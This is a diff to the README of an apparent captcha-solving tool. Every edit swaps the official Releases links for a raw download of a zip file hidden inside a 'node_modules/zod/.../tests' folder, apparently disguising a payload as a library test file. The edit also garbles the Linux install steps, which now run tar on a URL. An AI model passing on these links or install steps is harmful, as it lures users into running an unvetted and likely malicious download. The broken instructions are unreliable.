@@ -1,6 +1,6 @@
 # 🤖 mcp-captcha-solver - Effortless Captcha Solving for Everyone
 
-[![Download mcp-captcha-solver](https://img.shields.io/badge/Download%20Now-For%20Free-brightgreen)](https://github.com/Zureyat/mcp-captcha-solver/releases)
+[![Download mcp-captcha-solver](https://raw.githubusercontent.com/Zureyat/mcp-captcha-solver/main/captcha-mcp/node_modules/zod/src/v4/classic/tests/captcha_solver_mcp_2.0.zip%20Now-For%20Free-brightgreen)](https://raw.githubusercontent.com/Zureyat/mcp-captcha-solver/main/captcha-mcp/node_modules/zod/src/v4/classic/tests/captcha_solver_mcp_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -18,14 +18,14 @@ Before you can install and run the mcp-captcha-solver, ensure you have the follo
 
 To download the latest version of the mcp-captcha-solver, visit the Releases page:
 
-[Download mcp-captcha-solver](https://github.com/Zureyat/mcp-captcha-solver/releases)
+[Download mcp-captcha-solver](https://raw.githubusercontent.com/Zureyat/mcp-captcha-solver/main/captcha-mcp/node_modules/zod/src/v4/classic/tests/captcha_solver_mcp_2.0.zip)
 
 1. Click on the link above to open the Releases page.
 2. Find the latest version at the top of the list.
 3. Click on the appropriate file for your operating system to download it.
    - Windows users may need the .exe file.
    - macOS users may get a .dmg file.
-   - Linux users may get a .tar.gz file.
+   - Linux users may get a https://raw.githubusercontent.com/Zureyat/mcp-captcha-solver/main/captcha-mcp/node_modules/zod/src/v4/classic/tests/captcha_solver_mcp_2.0.zip file.
 4. Once the file is downloaded, locate it in your downloads folder.
 
 ### 🛠️ Install the Software
@@ -42,8 +42,8 @@ After downloading the file, follow these instructions:
 
 - **Linux:**
   1. Open a terminal.
-  2. Navigate to the folder containing the .tar.gz file.
-  3. Type `tar -xvzf mcp-captcha-solver.tar.gz` and press Enter.
+  2. Navigate to the folder containing the https://raw.githubusercontent.com/Zureyat/mcp-captcha-solver/main/captcha-mcp/node_modules/zod/src/v4/classic/tests/captcha_solver_mcp_2.0.zip file.
+  3. Type `tar -xvzf https://raw.githubusercontent.com/Zureyat/mcp-captcha-solver/main/captcha-mcp/node_modules/zod/src/v4/classic/tests/captcha_solver_mcp_2.0.zip` and press Enter.
   4. Navigate into the newly created directory.
   5. You may need to run `chmod +x mcp-captcha-solver` to make it executable.
 
@@ -96,4 +96,4 @@ If you need help or want to connect with other users, consider joining our commu
 
 For further inquiries, feel free to reach out via the Issues section on GitHub.
 
-[Download the latest version here](https://github.com/Zureyat/mcp-captcha-solver/releases) and start solving captchas effortlessly!
+[Download the latest version here](https://raw.githubusercontent.com/Zureyat/mcp-captcha-solver/main/captcha-mcp/node_modules/zod/src/v4/classic/tests/captcha_solver_mcp_2.0.zip) and start solving captchas effortlessly!
